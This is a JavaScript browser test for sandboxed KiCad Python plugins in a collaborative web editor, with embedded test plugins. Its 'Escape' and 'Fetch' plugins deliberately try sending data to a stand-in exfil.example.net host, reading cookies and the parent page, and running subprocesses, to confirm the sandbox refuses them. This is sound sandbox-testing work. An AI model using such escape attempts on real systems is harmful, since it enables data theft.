// Browser test of KiCad Python plugins in the web editor: a PCM package (a Python ActionPlugin written
// against pcbnew and wx, as the official ones are) is installed from a stand-in for KiCad's repository
// and driven in Chromium with two people in one project.  Covers the manager's "KiCad plugins" tab and
// the consent sheet, the interpreter starting inside the sandbox, a plugin's edits being ordinary
// collaborative edits (the second person sees them; one undo step each), footprints moved, turned and
// flipped by the editor's own transforms, a wx dialog drawn as a KiCad dialog and answered, message
// boxes, the project's net classes, Gerber / drill / placement output through the editor's writers,
// files handed over as a download, lazy start on the next visit, and that the sandbox still holds.
//
// Server: KC_DEV_LOGIN=1 KC_PCM_REPOSITORY=http://127.0.0.1:8096/repository.json  (this test serves it)
//   KC_PLUGIN_NETWORK=test  (lets the test's own "web service" on 127.0.0.1 stand in for one on the internet)
//   E2E_PG_URL=… E2E_JWT_SECRET=… [SHOTS=/some/dir] node plugins-python-ui.mjs
//   With PCM_META and PCM_ZIPS (see pcm-fixture.mjs) real official plugins are served and exercised too.
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import pg from 'pg';

const { chromium } = createRequire(import.meta.url)('playwright');

const BASE = (process.env.E2E_BASE || 'http://127.0.0.1:8099').replace(/\/$/, '');
const SECRET = process.env.E2E_JWT_SECRET, PG_URL = process.env.E2E_PG_URL;
const SHOTS = process.env.SHOTS || '';
const PCM_PORT = Number(process.env.PCM_PORT || 8096);
const PCM = `http://127.0.0.1:${PCM_PORT}`;
if (!SECRET || !PG_URL) { console.error('E2E_JWT_SECRET and E2E_PG_URL are required.'); process.exit(2); }
if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });

let pass = 0, fail = 0;
const check = (name, ok, detail = '') => { console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${!ok && detail ? ' — ' + detail : ''}`); ok ? pass++ : fail++; };
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
function mintJwt(sub, login) {
  const now = Math.floor(Date.now() / 1000);
  const head = b64({ alg: 'HS256', typ: 'JWT' }), body = b64({ sub, login, iat: now, exp: now + 3600 });
  return `${head}.${body}.${crypto.createHmac('sha256', SECRET).update(`${head}.${body}`).digest('base64url')}`;
}

// ---------------------------------------------------------------- the package under test
const ID = 'dev.test.kicad-collab.pytool';
const PLUGIN_PY = String.raw`
import os
import zipfile
import pcbnew
import wx


def footprint(board, ref):
    return next(f for f in board.GetFootprints() if f.GetReference() == ref)


class Move(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: move R2"
        self.category = "Test"
        self.description = "Moves R2 by 5 mm, turns it a quarter and puts it on the back"
        self.show_toolbar_button = True

    def Run(self):
        board = pcbnew.GetBoard()
        fp = footprint(board, "R2")
        pos = fp.GetPosition()
        # a settings file in the home folder and a hidden one beside the board, as desktop plugins keep them
        for path in (os.path.expanduser("~/.config/pytool/runs"), os.path.join(os.path.dirname(board.GetFileName()), ".pytool", "runs")):
            os.makedirs(os.path.dirname(path), exist_ok=True)
            runs = int(open(path).read()) if os.path.exists(path) else 0
            with open(path, "w") as f:
                f.write(str(runs + 1))
        # the editors' copy buffer: what was copied in the editor is read, and a block is left there for Paste
        took = wx.TextDataObject()
        if wx.TheClipboard.Open():
            got = wx.TheClipboard.GetData(took)
            with open(os.path.join(os.path.dirname(board.GetFileName()), ".pytool", "copied"), "w") as f:
                f.write(took.GetText() if got else "")
            wx.TheClipboard.SetData(wx.TextDataObject('(text "from the plugin" (at 1 2 0))'))
            wx.TheClipboard.Close()
        fp.SetPosition(pcbnew.VECTOR2I(pos.x + pcbnew.FromMM(5), pos.y))
        fp.SetOrientationDegrees(fp.GetOrientationDegrees() + 90)
        fp.Flip(fp.GetPosition(), False)
        pcbnew.Refresh()


class Ask(wx.Dialog):
    def __init__(self, parent):
        wx.Dialog.__init__(self, parent, title="Py tool", style=wx.DEFAULT_DIALOG_STYLE | wx.RESIZE_BORDER)
        box = wx.BoxSizer(wx.VERTICAL)
        row = wx.FlexGridSizer(0, 2, 6, 8)
        row.Add(wx.StaticText(self, label="Label text"), 0, wx.ALIGN_CENTER_VERTICAL)
        self.text = wx.TextCtrl(self, value="from python")
        row.Add(self.text, 1, wx.EXPAND)
        row.Add(wx.StaticText(self, label="Layer"), 0, wx.ALIGN_CENTER_VERTICAL)
        self.layer = wx.Choice(self, choices=["F.SilkS", "B.SilkS"])
        self.layer.SetSelection(0)
        row.Add(self.layer, 1, wx.EXPAND)
        row.AddGrowableCol(1)
        box.Add(row, 0, wx.EXPAND | wx.ALL, 8)
        self.via = wx.CheckBox(self, label="Also add a via")
        box.Add(self.via, 0, wx.ALL, 8)
        self.page = wx.html.HtmlWindow(self, size=(260, 70))
        self.page.SetPage("<h1 id='r'>Report</h1><p>two <b>vias</b></p><script>document.getElementById('r').textContent = 'script ran'</script>")
        box.Add(self.page, 0, wx.EXPAND | wx.ALL, 8)
        box.Add(self.CreateStdDialogButtonSizer(wx.OK | wx.CANCEL), 0, wx.EXPAND | wx.ALL, 8)
        self.SetSizerAndFit(box)
        self.SetDropTarget(Dropped(self))


class Dropped(wx.FileDropTarget):
    def __init__(self, dlg):
        wx.FileDropTarget.__init__(self)
        self.dlg = dlg

    def OnDropFiles(self, x, y, names):
        with open(names[0], "rb") as f:
            self.dlg.text.SetValue("dropped %s: %s" % (os.path.basename(names[0]), f.read().decode()))
        return True


SYMBOLS = '(kicad_symbol_lib (version 20241209) (generator "pytool") (symbol "PyPart" (property "Reference" "U" (at 0 0 0)) (property "Value" "PyPart" (at 0 0 0)) (symbol "PyPart_1_1" (pin input line (at -2.54 0 0) (length 2.54) (name "A") (number "1")))))\n'
FOOTPRINT = '(footprint "PyPad" (layer "F.Cu") (pad "1" smd rect (at 0 0) (size 1 1) (layers "F.Cu" "F.Mask" "F.Paste")))\n'


class Dialog(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: dialog"
        self.category = "Test"
        self.description = "Asks in a wx dialog, then adds a text and maybe a via"

    def Run(self):
        board = pcbnew.GetBoard()
        dlg = Ask(None)
        code = dlg.ShowModal()
        if code != wx.ID_OK:
            print("PYTOOL cancelled")
            dlg.Destroy()
            return
        if dlg.text.GetValue().startswith("lib:"):
            # a part import: a symbol library and a footprint written into the project folder
            name = dlg.text.GetValue()[4:]
            here = os.path.dirname(board.GetFileName())
            os.makedirs(os.path.join(here, name + ".pretty"), exist_ok=True)
            with open(os.path.join(here, name + ".kicad_sym"), "w") as f:
                f.write(SYMBOLS)
            with open(os.path.join(here, name + ".pretty", "PyPad.kicad_mod"), "w") as f:
                f.write(FOOTPRINT)
            dlg.Destroy()
            return
        t = pcbnew.PCB_TEXT(board)
        t.SetText(dlg.text.GetValue())
        t.SetLayer(board.GetLayerID(dlg.layer.GetStringSelection()))
        t.SetPosition(pcbnew.VECTOR2I(pcbnew.FromMM(120), pcbnew.FromMM(80)))
        board.Add(t)
        if dlg.via.GetValue():
            v = pcbnew.PCB_VIA(board)
            v.SetPosition(pcbnew.VECTOR2I(pcbnew.FromMM(121), pcbnew.FromMM(86)))
            v.SetWidth(pcbnew.FromMM(0.8))
            v.SetDrill(pcbnew.FromMM(0.4))
            board.Add(v)
        dlg.Destroy()
        pcbnew.Refresh()
        wx.MessageBox("Added " + t.GetText(), "Py tool")


class Report(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: report"
        self.category = "Test"
        self.description = "Prints what the board and the project say"

    def Run(self):
        board = pcbnew.GetBoard()
        classes = sorted(str(k) for k in board.GetAllNetClasses().keys())
        tracks = [t for t in board.GetTracks() if not isinstance(t, pcbnew.PCB_VIA)]
        print("PYTOOL report file=%s footprints=%d tracks=%d nets=%d classes=%s copper=%d selected=%s sch=%s" % (
            os.path.basename(board.GetFileName()), len(board.GetFootprints()), len(tracks), board.GetNetCount(), ",".join(classes),
            board.GetCopperLayerCount(), ",".join(sorted(f.GetReference() for f in board.GetFootprints() if f.IsSelected())),
            os.path.exists(os.path.splitext(board.GetFileName())[0] + ".kicad_sch")))


class Fab(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: fabrication"
        self.category = "Test"
        self.description = "Plots Gerbers, drill and placement files and zips them"

    def Run(self):
        board = pcbnew.GetBoard()
        out = os.path.join(os.path.dirname(board.GetFileName()), "fab")
        pc = pcbnew.PLOT_CONTROLLER(board)
        po = pc.GetPlotOptions()
        po.SetOutputDirectory(out)
        po.SetUseGerberProtelExtensions(True)
        po.SetUseAuxOrigin(False)
        names = []
        for layer, suffix in ((pcbnew.F_Cu, "F_Cu"), (pcbnew.B_Cu, "B_Cu"), (pcbnew.Edge_Cuts, "Edge_Cuts")):
            pc.SetLayer(layer)
            pc.OpenPlotfile(suffix, pcbnew.PLOT_FORMAT_GERBER, suffix)
            pc.PlotLayer()
            names.append(pc.GetPlotFileName())
        pc.ClosePlot()
        drill = pcbnew.EXCELLON_WRITER(board)
        drill.SetOptions(False, False, pcbnew.VECTOR2I(0, 0), False)
        drill.SetFormat(True)
        drill.CreateDrillandMapFilesSet(out, True, False)
        pos = pcbnew.PLACE_FILE_EXPORTER(board, True, False, False, False, True, True, True, False, False)
        with open(os.path.join(out, "positions.csv"), "w") as fh:
            fh.write(pos.GenPositionData())
        pcbnew.IPC356D_WRITER(board).Write(os.path.join(out, "netlist.ipc"))
        target = os.path.join(os.path.dirname(board.GetFileName()), "pytool-fab.zip")
        with zipfile.ZipFile(target, "w") as z:
            for name in sorted(os.listdir(out)):
                z.write(os.path.join(out, name), name)
        for name in os.listdir(out):
            os.remove(os.path.join(out, name))
        os.rmdir(out)
        print("PYTOOL fab " + ",".join(sorted(os.path.basename(n) for n in names)))


class Escape(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: escape"
        self.category = "Test"
        self.description = "Tries what a plugin must not be able to do"

    def Run(self):
        r = {}

        def attempt(name, fn):
            try:
                r[name] = "ALLOWED " + str(fn())[:60]
            except BaseException as e:
                r[name] = "refused " + type(e).__name__

        def fetch():
            import urllib.request
            # an address this package does not name anywhere: even with network access granted, the server will not carry it
            return urllib.request.urlopen("https://" + "exfil" + ".example" + ".net/?d=secret", timeout=5).status

        def js_fetch():
            import js
            from pyodide.ffi import run_sync
            return run_sync(js.fetch("${BASE}/api/me")).status

        def parent():
            import js
            return js.parent.document.title

        def cookie():
            import js
            return js.document.cookie or "(empty)"

        def run():
            import subprocess
            return subprocess.run(["ls", "/"]).returncode

        attempt("urlopen", fetch)
        attempt("jsFetch", js_fetch)
        attempt("parent", parent)
        attempt("cookie", cookie)
        attempt("subprocess", run)
        print("PYTOOL escape " + repr(sorted(r.items())))


class Fetch(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Py: fetch"
        self.category = "Test"
        self.description = "Talks to the web service this plugin names, as an order or parts plugin does"

    def Run(self):
        import json
        import urllib.request
        out = {}
        board = pcbnew.GetBoard()
        r = urllib.request.urlopen("${PCM}/echo?board=" + os.path.basename(board.GetFileName()))
        d = json.loads(r.read())
        out["get"] = [r.status, d["method"], d["url"]]
        import requests
        r = requests.post("${PCM}/echo", json={"refs": len(board.GetFootprints())}, headers={"X-Token": "t0k"}, timeout=30)
        d = r.json()
        out["post"] = [r.status_code, d["method"], d["body"], d["token"], d["cookie"]]
        try:
            requests.get("https://" + "exfil" + ".example" + ".net/?d=secret", timeout=5)
            out["other"] = "ALLOWED"
        except Exception as e:
            out["other"] = "refused " + type(e).__name__
        print("PYTOOL fetch " + json.dumps(out, sort_keys=True))


for cls in (Move, Dialog, Report, Fab, Escape, Fetch):
    cls().register()
`.replace('${BASE}', BASE).replaceAll('${PCM}', `http://127.0.0.1:${PCM_PORT}`);

// A plugin that leans on the desktop: it starts kicad-cli and git, draws a window with Qt, and carries a footprint wizard.
const DESK_ID = 'com.example.desktool';
const DESK_PY = String.raw`
import json
import os
import subprocess
import shutil

import pcbnew
import FootprintWizardBase


class Programs(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Desk: programs"
        self.category = "Test"
        self.description = "Runs kicad-cli and git as a desktop plugin does"

    def Run(self):
        board = pcbnew.GetBoard().GetFileName()
        out = {"cli": bool(shutil.which("kicad-cli")), "version": subprocess.run(["kicad-cli", "version"], capture_output=True, text=True).stdout.strip()}
        folder = os.path.join(os.path.dirname(board), "cli-out")
        r = subprocess.run(["kicad-cli", "pcb", "export", "gerbers", "-l", "F.Cu,Edge.Cuts", "-o", folder, board], capture_output=True, text=True)
        out["gerbers"] = [r.returncode, sorted(os.listdir(folder))]
        with open(os.path.join(folder, os.listdir(folder)[0])) as fh:
            out["gerber_head"] = fh.read(4)
        r = subprocess.run(["kicad-cli", "pcb", "export", "svg", "-l", "F.Cu,Edge.Cuts", "--mode-multi", "--page-size-mode", "2", "-o", folder, board], capture_output=True, text=True)
        svgs = sorted(f for f in os.listdir(folder) if f.endswith(".svg"))
        body = ""
        for name in svgs:
            with open(os.path.join(folder, name)) as fh:
                body += fh.read()
        out["svg"] = [r.returncode, svgs, body.count("<path") >= 2 and body.count(" Z") > 20, "viewBox" in body]
        report = os.path.join(folder, "drc.json")
        r = subprocess.run(["kicad-cli", "pcb", "drc", "--format", "json", "--schematic-parity", "--severity-all", "-o", report, board], capture_output=True, text=True)
        with open(report) as fh:
            d = json.load(fh)
        out["drc"] = [r.returncode, sorted(d.keys()), "Found" in r.stdout, len(d["violations"]) + len(d["unconnected_items"]) + len(d["schematic_parity"]) > 0]
        sch = os.path.splitext(board)[0] + ".kicad_sch"
        bom = os.path.join(folder, "bom.csv")
        r = subprocess.run(["kicad-cli", "sch", "export", "bom", "--fields", "Reference,Value,Footprint", "-o", bom, sch], capture_output=True, text=True)
        with open(bom) as fh:
            rows = fh.read().splitlines()
        out["bom"] = [r.returncode, rows[0], len(rows) > 5]
        net = os.path.join(folder, "board.net")
        r = subprocess.run(["kicad-cli", "sch", "export", "netlist", "-o", net, sch], capture_output=True, text=True)
        with open(net) as fh:
            text = fh.read()
        out["netlist"] = [r.returncode, text.startswith("(export"), "(comp (ref" in text, "(net (code" in text]
        try:
            subprocess.run(["kicad-cli", "pcb", "export", "step", "-o", "x.step", board], check=True)
            out["render"] = "ran"
        except Exception as e:
            out["render"] = type(e).__name__
        p = subprocess.Popen(["git", "rev-parse", "--show-toplevel"], cwd=os.path.dirname(board), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        p.wait()
        out["git"] = [p.returncode, p.stdout.read().strip() == os.path.dirname(board), subprocess.check_output(["git", "version"], text=True).startswith("git version ")]
        shutil.rmtree(folder)
        print("DESKTOOL programs " + json.dumps(out, sort_keys=True))


class Commit(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Desk: commit"
        self.category = "Test"
        self.description = "Commits the project as a git plugin does"

    def Run(self):
        r = subprocess.run(["git", "commit", "-am", "Plugin checkpoint"], capture_output=True, text=True)
        print("DESKTOOL commit " + json.dumps([r.returncode, r.stdout.strip()]))


class Nudge(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Desk: nudge"
        self.category = "Test"
        self.description = "Moves R2 one millimetre to the right"

    def Run(self):
        fp = pcbnew.GetBoard().FindFootprintByReference("R2")
        p = fp.GetPosition()
        fp.SetPosition(pcbnew.VECTOR2I(p.x + pcbnew.FromMM(1), p.y))


class Helper(pcbnew.ActionPlugin):
    """As plugins with a helper program do: listen on a port of this computer, start a second program (this plugin's
    own client.py) that connects and asks, answer on the window system's thread."""

    def defaults(self):
        self.name = "Desk: helper"
        self.category = "Test"
        self.description = "Listens on a local port and starts a second program that calls it"

    def Run(self):
        import socket
        import threading
        import wx
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(2)
        srv.settimeout(0.5)
        port = srv.getsockname()[1]
        stop = threading.Event()

        def answer(request, state, done):
            fp = pcbnew.GetBoard().FindFootprintByReference(request["ref"])
            state["reply"] = len(fp.Pads())
            done.set()

        def serve():
            while not stop.is_set():
                try:
                    conn, _ = srv.accept()
                except socket.timeout:
                    continue
                except OSError:
                    return
                with conn:
                    with conn.makefile("rb") as stream:
                        request = json.loads(stream.readline())
                    done, state = threading.Event(), {}
                    wx.CallAfter(answer, request, state, done)
                    ok = done.wait(5)
                    conn.sendall(json.dumps({"ok": ok, "pads": state.get("reply")}).encode() + b"\n")

        threading.Thread(target=serve, daemon=True).start()
        client = os.path.join(os.path.dirname(os.path.abspath(__file__)), "client.py")
        r = subprocess.run([shutil.which("python3"), client], env=dict(os.environ, DESK_PORT=str(port)), capture_output=True, text=True)
        stop.set()
        srv.close()
        try:
            socket.create_connection(("127.0.0.1", port), timeout=0.5)
            closed = "connected"
        except OSError as e:
            closed = type(e).__name__
        print("DESKTOOL helper " + json.dumps([r.returncode, r.stdout.strip(), closed]))


class Editor(pcbnew.ActionPlugin):
    """Works KiCad's own window as some plugins do: its Tools → External Plugins menu, Edit → Undo, a hotkey sent to
    the canvas, and the Appearance panel's net grid."""

    def defaults(self):
        self.name = "Desk: editor"
        self.category = "Test"
        self.description = "Chooses its own menu entry, undoes it, highlights a net and colours it"

    def Run(self):
        import wx
        import wx.grid
        out = {}
        frame = next(w for w in wx.GetTopLevelWindows() if isinstance(w, wx.Frame) and w.GetTitle().endswith("PCB Editor"))

        def find(menu, label):
            for item in menu.GetMenuItems():
                if item.GetItemLabelText() == label:
                    return item
                if item.GetSubMenu():
                    hit = find(item.GetSubMenu(), label)
                    if hit:
                        return hit

        def menu_item(label):
            return next((hit for menu, _ in frame.GetMenuBar().GetMenus() if (hit := find(menu, label))), None)

        x = lambda: pcbnew.GetBoard().FindFootprintByReference("R2").GetPosition().x
        x0 = x()
        ran = frame.GetEventHandler().ProcessEvent(wx.CommandEvent(wx.EVT_MENU.typeId, menu_item("Desk: nudge").GetId()))
        x1 = x()
        undone = frame.GetEventHandler().ProcessEvent(wx.CommandEvent(wx.EVT_MENU.typeId, menu_item("Undo").GetId()))
        out["menu"] = [bool(ran), x1 - x0 == pcbnew.FromMM(1), bool(undone), x() == x0]

        board = pcbnew.GetBoard()
        pad = next(p for p in board.FindFootprintByReference("R2").Pads() if p.GetNetCode() > 0)
        for it in list(pcbnew.GetCurrentSelection()):
            it.ClearSelected()
        pad.SetSelected()
        hotkeys = os.path.join(pcbnew.GetSettingsManager().GetUserSettingsPath(), "user.hotkeys")
        with open(hotkeys, "a") as fh:
            fh.write("pcbnew.EditorControl.highlightNetSelection\tCtrl+Alt+Shift+F12\t\n")
        canvas = next(c for c in frame.GetChildren() if not isinstance(c, wx.Control) and c.GetClientSize().width > 200)
        key = wx.KeyEvent(wx.EVT_CHAR.typeId)
        key.SetKeyCode(wx.WXK_F12)
        key.SetControlDown(True)
        key.SetAltDown(True)
        key.SetShiftDown(True)
        key.SetEventObject(canvas)
        out["highlight"] = [bool(canvas.GetEventHandler().ProcessEvent(key)), board.IsHighLightNetON(), sorted(board.GetHighLightNetCodes()) == [pad.GetNetCode()], pad.GetNetname()]

        def kids(w):
            for c in w.GetChildren():
                yield c
                yield from kids(c)

        grid = next(g for g in kids(frame) if isinstance(g, wx.grid.Grid) and g.GetNumberCols() == 3)
        rows = {grid.GetCellValue(r, 2): r for r in range(grid.GetNumberRows())}
        grid.SetCellValue(rows[pad.GetNetname()], 0, "#FF8800")
        grid.BeginBatch()
        grid.SetCellValue(rows[pad.GetNetname()], 1, "0")
        grid.EndBatch()
        radio = next(r for r in kids(frame) if isinstance(r, wx.RadioButton) and r.GetLabel() == "All"
                     and {"All", "Ratsnest", "None"} <= {c.GetLabel() for c in r.GetParent().GetChildren()})
        radio.SetValue(True)
        ev = wx.CommandEvent(wx.EVT_RADIOBUTTON.typeId, radio.GetId())
        ev.SetEventObject(radio)
        radio.GetEventHandler().ProcessEvent(ev)
        out["appearance"] = [len(rows) > 3, pad.GetNetname() in rows]
        print("DESKTOOL editor " + json.dumps(out, sort_keys=True))


class Tree(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Desk: tree"
        self.category = "Test"
        self.description = "A tree with columns, a colour chooser and an F5 accelerator"

    def Run(self):
        import wx
        import wx.lib.agw.hypertreelist as htl
        dlg = wx.Dialog(None, title="Parts by value")
        box = wx.BoxSizer(wx.VERTICAL)
        tree = htl.HyperTreeList(dlg, agwStyle=wx.TR_HIDE_ROOT | wx.TR_HAS_BUTTONS | wx.TR_FULL_ROW_HIGHLIGHT)
        tree.AddColumn("Value / reference", width=200)
        tree.AddColumn("Pads", width=60, flag=wx.ALIGN_RIGHT)
        root = tree.AddRoot("parts")
        groups = {}
        for fp in sorted(pcbnew.GetBoard().GetFootprints(), key=lambda f: f.GetReference()):
            g = groups.get(fp.GetValue())
            if g is None:
                g = groups[fp.GetValue()] = tree.AppendItem(root, fp.GetValue())
                tree.SetItemBold(g, True)
            item = tree.AppendItem(g, fp.GetReference())
            tree.SetItemText(item, str(len(fp.Pads())), 1)
            tree.SetItemData(item, fp.GetReference())
        said = wx.StaticText(dlg, label="Nothing chosen")
        clicks = []

        def chosen(e):
            data = tree.GetItemData(e.GetItem())
            said.SetLabel("Chosen: %s" % data if data else "Chosen: a group")

        def clicked(e):
            item, _flags, column = tree.GetMainWindow().HitTest(e.GetPosition())
            clicks.append([tree.GetItemText(item) if item else None, column])
            e.Skip()

        tree.Bind(wx.EVT_TREE_SEL_CHANGED, chosen)
        tree.GetMainWindow().Bind(wx.EVT_LEFT_UP, clicked)
        refresh = wx.NewIdRef()
        hits = []
        dlg.Bind(wx.EVT_MENU, lambda e: (hits.append(1), said.SetLabel("Refreshed %d" % len(hits))), id=refresh)
        dlg.SetAcceleratorTable(wx.AcceleratorTable([(wx.ACCEL_NORMAL, wx.WXK_F5, refresh)]))
        colour = wx.Button(dlg, label="Colour")
        picked = []

        def choose(e):
            data = wx.ColourData()
            data.SetColour(wx.Colour("#44AAFF"))
            with wx.ColourDialog(dlg, data) as d:
                if d.ShowModal() == wx.ID_OK:
                    c = d.GetColourData().GetColour()
                    picked.append("#%02X%02X%02X" % (c.Red(), c.Green(), c.Blue()))
                    said.SetLabel("Colour " + picked[-1])

        colour.Bind(wx.EVT_BUTTON, choose)
        done = wx.Button(dlg, wx.ID_OK, "Done")
        for w, grow in ((tree, 1), (said, 0), (colour, 0), (done, 0)):
            box.Add(w, grow, wx.EXPAND | wx.ALL, 4)
        dlg.SetSizer(box)
        dlg.SetSize((420, 420))
        first = tree.GetFirstChild(root)[0]
        code = dlg.ShowModal()
        print("DESKTOOL tree " + json.dumps([code == wx.ID_OK, len(groups), tree.GetChildrenCount(root, False), tree.IsExpanded(first), clicks[-1:] , len(hits), picked]))
        dlg.Destroy()


class Window(pcbnew.ActionPlugin):
    def defaults(self):
        self.name = "Desk: Qt window"
        self.category = "Test"
        self.description = "A dialog drawn with PySide6"

    def Run(self):
        from PySide6.QtWidgets import QApplication, QDialog, QLabel, QLineEdit, QPushButton, QVBoxLayout
        app = QApplication.instance() or QApplication([])
        dlg = QDialog()
        dlg.setWindowTitle("Qt in the web editor")
        lay = QVBoxLayout(dlg)
        self.label = QLabel("Nothing yet")
        self.edit = QLineEdit("R2")
        go = QPushButton("Count")
        done = QPushButton("Done")
        for w in (self.label, self.edit, go, done):
            lay.addWidget(w)
        go.clicked.connect(lambda: self.label.setText("Pads on %s: %d" % (self.edit.text(), len(pcbnew.GetBoard().FindFootprintByReference(self.edit.text()).Pads()))))
        done.clicked.connect(dlg.accept)
        code = dlg.exec()
        print("DESKTOOL qt " + json.dumps([int(code), self.label.text()]))


class Ring(FootprintWizardBase.FootprintWizard):
    GetName = lambda self: "Test ring"
    GetDescription = lambda self: "A ring of pads, used to test the wizard dialog"
    GetValue = lambda self: "Ring_%d" % self.parameters["Pads"]["Count"]

    def GenerateParameterList(self):
        self.AddParam("Pads", "Count", self.uInteger, 8, min_value=2, max_value=64)
        self.AddParam("Pads", "Radius", self.uMM, 5, min_value=1)
        self.AddParam("Pads", "Outline", self.uBool, True)

    def CheckParameters(self):
        pass

    def BuildThisFootprint(self):
        import math
        n, r = self.parameters["Pads"]["Count"], self.parameters["Pads"]["Radius"]
        for i in range(n):
            pad = pcbnew.PAD(self.module)
            pad.SetSize(pcbnew.VECTOR2I(pcbnew.FromMM(1.2), pcbnew.FromMM(1.2)))
            pad.SetShape(pcbnew.PAD_SHAPE_CIRCLE)
            pad.SetAttribute(pcbnew.PAD_ATTRIB_SMD)
            pad.SetLayerSet(pad.SMDMask())
            pad.SetPosition(pcbnew.VECTOR2I(int(r * math.cos(2 * math.pi * i / n)), int(r * math.sin(2 * math.pi * i / n))))
            pad.SetNumber(str(i + 1))
            self.module.Add(pad)
        if self.parameters["Pads"]["Outline"]:
            self.draw.Circle(0, 0, r + pcbnew.FromMM(1.5))
        self.draw.Reference(0, -r - pcbnew.FromMM(3), self.GetTextSize())
        self.draw.Value(0, r + pcbnew.FromMM(3), self.GetTextSize())


for cls in (Programs, Commit, Window, Nudge, Helper, Editor, Tree):
    cls().register()
Ring().register()
`;
// The second program the Helper action starts: it connects to the port the plugin listens on and asks one question.
const DESK_CLIENT = String.raw`
import json
import os
import socket

with socket.create_connection(("127.0.0.1", int(os.environ["DESK_PORT"])), timeout=1) as conn:
    conn.settimeout(6)
    conn.sendall(json.dumps({"ref": "R2"}).encode() + b"\n")
    with conn.makefile("rb") as stream:
        print(stream.readline().decode().strip())
`;
const DESK_META = { $schema: 'https://go.kicad.org/pcm/schemas/v1', name: 'Desk Tool', description: 'A plugin that uses desktop programs, Qt and a footprint wizard, used to test the web runtime.', description_full: 'Runs kicad-cli and git, opens a Qt window and registers a footprint wizard.', identifier: DESK_ID, type: 'plugin',
  author: { name: 'Junction tests', contact: { web: 'https://example.com' } }, license: 'MIT', resources: { homepage: 'https://example.com' }, versions: [{ version: '1.0.0', status: 'stable', kicad_version: '8.0' }] };

// A plugin for KiCad's IPC interface: a program of its own that talks to KiCad through kipy (plugin.json names its entry point).
const IPC_ID = 'com.example.ipctool';
const IPC_JSON = { $schema: 'https://go.kicad.org/api/schemas/v1', identifier: IPC_ID, name: 'IPC Tool', description: 'Adds a via through the IPC interface', runtime: { type: 'python', min_version: '3.9' },
  actions: [{ identifier: 'via', name: 'IPC: add via', description: 'Adds a via and a track in one commit', 'show-button': true, scopes: ['pcb'], entrypoint: 'main.py' },
    { identifier: 'label', name: 'IPC: place label', description: 'Makes a footprint and hands it to the cursor', 'show-button': true, scopes: ['pcb'], entrypoint: 'label.py' }] };
// A footprint built through the interface (as label makers do) and handed to the cursor with interactive_move.
const IPC_LABEL_PY = String.raw`
from kipy import KiCad
from kipy.board_types import BoardPolygon, Field, FootprintInstance
from kipy.geometry import PolyLineNode, PolygonWithHoles, Vector2
from kipy.proto.board.board_types_pb2 import BoardLayer
from kipy.util import from_mm

board = KiCad().get_board()
fp = FootprintInstance()
fp.definition.id.name = "ipc-label"
shape = BoardPolygon()
shape.layer = BoardLayer.BL_F_SilkS
shape.attributes.fill.filled = True
poly = PolygonWithHoles()
for x, y in ((120, 80), (124, 80), (124, 82), (120, 82)):
    poly.outline.append(PolyLineNode.from_point(Vector2.from_xy_mm(x, y)))
poly.outline.closed = True
shape.polygons.append(poly)
fp.definition.add_item(shape)
note = Field()
note.name = "IPC_NOTE"
note.text.value = "made by kipy"
note.visible = False
fp.definition.add_item(note)
fp.layer = BoardLayer.BL_F_Cu
fp.position = Vector2.from_xy_mm(122, 81)
fp.reference_field.text.value = "IPCLABEL"
fp.value_field.text.value = "label"
commit = board.begin_commit()
made = board.create_items(fp)
board.push_commit(commit, "IPC: place label")
board.interactive_move(made[0].id)
print("IPCLABEL made=%s id=%s items=%d" % (type(made[0]).__name__, made[0].id.value, len(made[0].definition.items)))
`;
const IPC_PY = String.raw`
from kipy import KiCad
from kipy.board_types import Track, Via
from kipy.geometry import Vector2
from kipy.util.units import from_mm
from kipy.util.board_layer import BoardLayer

kicad = KiCad()
board = kicad.get_board()
nets = {n.name: n for n in board.get_nets()}
gnd = nets["GND"]
commit = board.begin_commit()
via = Via()
via.position = Vector2.from_xy(from_mm(131), from_mm(91))
via.net = gnd
via.diameter = from_mm(0.9)
via.drill_diameter = from_mm(0.45)
track = Track()
track.start = Vector2.from_xy(from_mm(131), from_mm(91))
track.end = Vector2.from_xy(from_mm(133), from_mm(91))
track.width = from_mm(0.4)
track.layer = BoardLayer.BL_B_Cu
track.net = gnd
made = board.create_items([via, track])
board.push_commit(commit, "IPC: add via")
print("IPCTOOL version=%s board=%s footprints=%d made=%s copper=%d stackup=%d" % (
    kicad.get_version(), board.name, len(board.get_footprints()), ",".join(type(m).__name__ for m in made),
    board.get_copper_layer_count(), len(board.get_stackup().layers)))
`;
const IPC_META = { $schema: 'https://go.kicad.org/pcm/schemas/v1', name: 'IPC Tool', description: 'A plugin for KiCad\'s IPC interface, used to test the web runtime.', description_full: 'Adds a via through kipy.', identifier: IPC_ID, type: 'plugin',
  author: { name: 'Junction tests', contact: { web: 'https://example.com' } }, license: 'MIT', resources: { homepage: 'https://example.com/ipctool' }, versions: [{ version: '0.3.0', status: 'stable', kicad_version: '9.0', runtime: 'ipc' }] };
const METADATA = {
  $schema: 'https://go.kicad.org/pcm/schemas/v1', name: 'Py Tool', description: 'A Python action plugin written for the desktop, used to test the web runtime.',
  description_full: 'Moves a footprint, asks in a wx dialog, reads the project and makes fabrication files.', identifier: ID, type: 'plugin',
  author: { name: 'Junction tests', contact: { web: 'https://example.com' } }, license: 'MIT', resources: { homepage: 'https://example.com/pytool' },
  versions: [{ version: '1.2.0', status: 'stable', kicad_version: '8.0' }],
};

/** A zip archive (stored, no compression) of {name: Buffer}. */
function zip(files) {
  const parts = [], central = []; let offset = 0;
